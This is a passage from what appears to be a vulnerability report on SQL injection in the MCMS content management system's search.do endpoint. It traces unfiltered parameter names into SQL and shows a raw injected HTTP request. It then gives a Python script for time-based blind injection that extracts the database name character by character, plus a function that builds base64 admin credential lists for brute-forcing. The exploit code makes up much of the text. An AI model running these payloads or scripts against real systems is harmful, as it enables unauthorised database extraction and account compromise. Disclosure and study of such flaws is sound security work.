| As you can see, the injection was successful, and the next step is to save the post package and put it into sqlmap to run [image](https://user-images.githubusercontent.com/47287118/150349256-f4d140be-c973-468c-9239-384309afd3a7.png)  Look up for `filed` and find the incoming parameter [image](https://user-images.githubusercontent.com/47287118/150349300-0c8c74b0-2734-469d-a0ce-ce9f032942e6.png)  Since the parameter names are directly spliced with strings without filtering, then there may be a loophole, so let's move on to the next data chain [image](https://user-images.githubusercontent.com/47287118/150349351-25462576-50c7-45cd-ba3f-042780675506.png) [image](https://user-images.githubusercontent.com/47287118/150349378-395bca53-008d-4505-9431-5c4031426ecc.png) Since the parameter names are directly spliced with strings without filtering, then there may be a loophole, so let's move on to the next data chain [image](https://user-images.githubusercontent.com/47287118/150349446-eaa05c3e-09c3-4e7d-9722-329385cba00b.png) [image](https://user-images.githubusercontent.com/47287118/150349472-93194e44-127d-4934-88bd-4bdb6b856e6c.png) This block was found to have database calls [image](https://user-images.githubusercontent.com/47287118/150349523-43f20a16-e97a-46ff-b03e-a8ced1609962.png)  Next we try to inject, see the file `net/mingsoft/cms/action/web/MCmsAction.java` at the top of the class definition, you can know the route is `host:port/mcms`, and then add the method to be called, you can get the route is `host:port/mcms/ search.do`, next try to inject  ``` GET /mcms/search.do?1'=0000 HTTP/1.1 User-Agent: PostmanRuntime/7.29.0 Accept: */* Postman-Token: 315bc447-c977-4eb8-8b99-ae231e7a2b08 Host: localhost:8080 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID=96B0978724C81C34A99F09541FA893D4    ```  [image](https://user-images.githubusercontent.com/47287118/150349694-eb30229e-4606-407d-a3dd-d5a196be76c0.png)   ---   Next I wrote a py file for convenient validation, using delayed injection  ``` """ {0}：要查的东西 {1}：起始位置 {2}：长度 {3}：猜测的值 """ host = "http://localhost:8080/mcms/search.do?'%2b(select+'123'+AND+if(ascii(substr({0},{1},{2}))%3d{3},sleep(2),2)),--+=000"  def a():     with open("/Users/helu/penetration/bruteDicts/account/top500_username.txt", "r") as usernames:         with open("/Users/helu/penetration/bruteDicts/account/pwdFast.txt", "r") as pwds:             with open("/Users/helu/penetration/bruteDicts/account/admin_pwd.txt", "a+") as file:                 data1 = usernames.read().splitlines()                 data2 = pwds.read().splitlines()                 for username in data1:                     for pwd in data2:                         str = base64.encodebytes(("admin" + ":" + pwd).encode("utf-8"))                          # str += "\n"                         file.write(str.decode("utf-8"))  def timeout(url):     try:         rsp = requests.get(url, timeout=3)         return rsp.text     except Exception:         return "timeout"   def guess_length(target):     for i in range(1, 100):         url = host.format(target,1,1,i)         rsp = timeout(url)         if "timeout" in rsp:             print("库长：" + chr(i) )             return int(chr(i))  def guess_char(tar,len):     for i in range(0,len+1):         for j in range(47, 123):             url = host.format(tar,i,1,"'{0}'".format(j))             rsp = timeout(url)             if "timeout" in rsp:                 print(chr(j))  def b(tar):     length = guess_length(tar)     guess_char("database()",length)  b("length(database())")  ``` |
